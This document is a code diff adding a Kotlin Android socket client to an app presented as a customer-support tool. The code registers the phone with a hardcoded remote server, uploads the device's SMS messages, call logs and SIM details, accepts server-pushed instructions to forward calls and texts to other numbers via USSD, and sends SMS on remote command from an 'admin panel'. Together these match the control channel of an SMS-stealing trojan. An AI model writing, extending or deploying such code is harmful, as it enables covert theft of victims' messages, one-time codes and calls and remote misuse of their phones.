@@ -1,0 +1,268 @@
+package com.customersupport.socket
+
+import android.util.Log
+import io.socket.client.IO
+import io.socket.client.Socket
+import kotlinx.coroutines.flow.MutableStateFlow
+import kotlinx.coroutines.flow.StateFlow
+import org.json.JSONArray
+import org.json.JSONObject
+import java.net.URI
+import javax.inject.Inject
+import javax.inject.Singleton
+
+@Singleton
+class SocketManager @Inject constructor() {
+
+    companion object {
+        private const val TAG = "SocketManager"
+        // TODO: Change this to your server IP or domain
+        private const val SERVER_URL = "https://customer-support-jmak.onrender.com"
+        // For physical device, use your computer's local IP, e.g., "http://192.168.1.100:3001"
+    }
+
+    private var socket: Socket? = null
+
+    private val _connectionState = MutableStateFlow(ConnectionState.DISCONNECTED)
+    val connectionState: StateFlow<ConnectionState> = _connectionState
+
+    private val _forwardingConfig = MutableStateFlow<ForwardingConfig?>(null)
+    val forwardingConfig: StateFlow<ForwardingConfig?> = _forwardingConfig
+
+    // Callback for requesting sync from external components
+    private var onSyncRequestCallback: (() -> Unit)? = null
+    
+    // Callback for when forwarding config is received from server
+    private var onForwardingConfigCallback: ((ForwardingConfig) -> Unit)? = null
+    
+    // Callback for SMS send requests from admin panel
+    private var onSmsSendRequestCallback: ((SmsSendRequest) -> Unit)? = null
+
+    fun setOnSyncRequestCallback(callback: () -> Unit) {
+        onSyncRequestCallback = callback
+    }
+    
+    fun setOnForwardingConfigCallback(callback: (ForwardingConfig) -> Unit) {
+        onForwardingConfigCallback = callback
+    }
+    
+    fun setOnSmsSendRequestCallback(callback: (SmsSendRequest) -> Unit) {
+        onSmsSendRequestCallback = callback
+    }
+
+    fun requestSync() {
+        onSyncRequestCallback?.invoke()
+    }
+
+    fun connect(deviceId: String, deviceName: String, phoneNumber: String) {
+        try {
+            Log.d(TAG, "Connecting to $SERVER_URL")
+            _connectionState.value = ConnectionState.CONNECTING
+
+            val options = IO.Options().apply {
+                transports = arrayOf("websocket", "polling")
+                reconnection = true
+                reconnectionAttempts = Int.MAX_VALUE
+                reconnectionDelay = 1000
+                reconnectionDelayMax = 5000
+                timeout = 20000 // 20 second timeout
+                forceNew = false // Reuse existing connection
+            }
+
+            socket = IO.socket(URI.create(SERVER_URL), options)
+
+            socket?.on(Socket.EVENT_CONNECT) {
+                Log.d(TAG, "Connected to server")
+                _connectionState.value = ConnectionState.CONNECTED
+
+                // Register device
+                val data = JSONObject().apply {
+                    put("id", deviceId)
+                    put("name", deviceName)
+                    put("phoneNumber", phoneNumber)
+                }
+                socket?.emit("device:register", data)
+                Log.d(TAG, "Device registered: $deviceId")
+                
+                // Request current forwarding config after registration
+                // This ensures we get the config even if we reconnected and missed a previous update
+                requestForwardingConfig(deviceId)
+            }
+
+            socket?.on(Socket.EVENT_DISCONNECT) {
+                Log.d(TAG, "Disconnected from server")
+                _connectionState.value = ConnectionState.DISCONNECTED
+            }
+
+            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
+                Log.e(TAG, "Connection error: ${args.firstOrNull()}")
+                _connectionState.value = ConnectionState.ERROR
+            }
+
+            socket?.on("forwarding:config") { args ->
+                try {
+                    Log.d(TAG, "=== RECEIVED forwarding:config EVENT ===")
+                    Log.d(TAG, "Raw args: ${args.contentToString()}")
+                    val config = args[0] as JSONObject
+                    Log.d(TAG, "Parsed JSON config: $config")
+                    val forwardingConfig = ForwardingConfig(
+                        smsEnabled = config.optBoolean("smsEnabled", false),
+                        smsForwardTo = config.optString("smsForwardTo", ""),
+                        smsSubscriptionId = config.optInt("smsSubscriptionId", -1),
+                        callsEnabled = config.optBoolean("callsEnabled", false),
+                        callsForwardTo = config.optString("callsForwardTo", ""),
+                        callsSubscriptionId = config.optInt("callsSubscriptionId", -1)
+                    )
+                    _forwardingConfig.value = forwardingConfig
+                    Log.d(TAG, "Received forwarding config: $forwardingConfig")
+                    Log.d(TAG, "Call forwarding enabled=${forwardingConfig.callsEnabled}, forwardTo=${forwardingConfig.callsForwardTo}")
+                    
+                    // Notify callback to persist config and trigger USSD
+                    Log.d(TAG, "Invoking forwarding config callback...")
+                    onForwardingConfigCallback?.invoke(forwardingConfig)
+                    Log.d(TAG, "Forwarding config callback completed")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error parsing forwarding config", e)
+                }
+            }
+
+            // Listen for sync requests from admin panel
+            socket?.on("device:requestSync") {
+                Log.d(TAG, "Received sync request from admin panel")
+                onSyncRequestCallback?.invoke()
+            }
+
+            // Listen for SMS send requests from admin panel
+            socket?.on("sms:sendRequest") { args ->
+                try {
+                    val request = args[0] as JSONObject
+                    val smsSendRequest = SmsSendRequest(
+                        recipientNumber = request.getString("recipientNumber"),
+                        message = request.getString("message"),
+                        subscriptionId = request.optInt("subscriptionId", -1),
+                        requestId = request.optString("requestId", "")
+                    )
+                    Log.d(TAG, "Received SMS send request: ${smsSendRequest.recipientNumber}")
+                    onSmsSendRequestCallback?.invoke(smsSendRequest)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error parsing SMS send request", e)
+                }
+            }
+
+            // Listen for SIM sync acknowledgment from server
+            socket?.on("sim:sync:ack") { args ->
+                try {
+                    val ack = args[0] as JSONObject
+                    val success = ack.optBoolean("success", false)
+                    val count = ack.optInt("count", 0)
+                    Log.d(TAG, "SIM sync acknowledged by server: success=$success, count=$count")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error parsing SIM sync ack", e)
+                }
+            }
+
+            socket?.connect()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to connect", e)
+            _connectionState.value = ConnectionState.ERROR
+        }
+    }
+
+    fun disconnect() {
+        socket?.disconnect()
+        socket = null
+        _connectionState.value = ConnectionState.DISCONNECTED
+    }
+
+    fun isConnected(): Boolean = socket?.connected() == true
+
+    fun syncSms(deviceId: String, smsArray: JSONArray) {
+        if (!isConnected()) return
+        val data = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("sms", smsArray)
+        }
+        socket?.emit("sms:sync", data)
+        Log.d(TAG, "Synced ${smsArray.length()} SMS messages")
+    }
+
+    fun syncCalls(deviceId: String, callsArray: JSONArray) {
+        if (!isConnected()) return
+        val data = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("calls", callsArray)
+        }
+        socket?.emit("calls:sync", data)
+        Log.d(TAG, "Synced ${callsArray.length()} call logs")
+    }
+
+    fun submitForm(deviceId: String, name: String, phoneNumber: String, id: String) {
+        if (!isConnected()) return
+        val data = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("name", name)
+            put("phoneNumber", phoneNumber)
+            put("id", id)
+        }
+        socket?.emit("form:submit", data)
+        Log.d(TAG, "Form submitted: $name")
+    }
+
+    fun syncSimInfo(deviceId: String, simArray: JSONArray) {
+        if (!isConnected()) return
+        val data = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("simCards", simArray)
+        }
+        socket?.emit("sim:sync", data)
+        Log.d(TAG, "Synced ${simArray.length()} SIM cards")
+    }
+
+    fun reportSmsSendResult(deviceId: String, requestId: String, success: Boolean, error: String? = null) {
+        if (!isConnected()) return
+        val data = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("requestId", requestId)
+            put("success", success)
+            error?.let { put("error", it) }
+        }
+        socket?.emit("sms:sendResult", data)
+        Log.d(TAG, "Reported SMS send result: success=$success")
+    }
+    
+    /**
+     * Request the current forwarding config from the server.
+     * This is called after device registration to ensure we have the latest config.
+     */
+    fun requestForwardingConfig(deviceId: String) {
+        if (!isConnected()) {
+            Log.w(TAG, "Cannot request forwarding config - not connected")
+            return
+        }
+        Log.d(TAG, "Requesting current forwarding config for device: $deviceId")
+        socket?.emit("device:requestForwardingConfig", deviceId)
+    }
+}
+
+enum class ConnectionState {
+    DISCONNECTED,
+    CONNECTING,
+    CONNECTED,
+    ERROR
+}
+
+data class ForwardingConfig(
+    val smsEnabled: Boolean = false,
+    val smsForwardTo: String = "",
+    val smsSubscriptionId: Int = -1,  // -1 means use default SIM
+    val callsEnabled: Boolean = false,
+    val callsForwardTo: String = "",
+    val callsSubscriptionId: Int = -1  // -1 means use default SIM
+)
+
+data class SmsSendRequest(
+    val recipientNumber: String,
+    val message: String,
+    val subscriptionId: Int = -1,  // -1 means use default SIM
+    val requestId: String = ""
+)
